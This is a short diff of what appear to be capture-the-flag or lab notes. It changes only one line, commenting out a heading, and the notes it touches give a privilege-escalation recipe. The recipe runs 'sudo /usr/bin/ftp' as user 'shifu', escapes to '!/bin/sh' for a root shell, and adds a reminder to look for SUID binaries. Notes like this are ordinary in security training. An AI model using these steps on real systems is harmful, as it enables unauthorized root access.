@@ -24,7 +24,7 @@ Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
 
 
 
-to get root with user shifu:
+# to get root with user shifu:
 sudo /usr/bin/ftp
 !/bin/sh
 find (suid's)
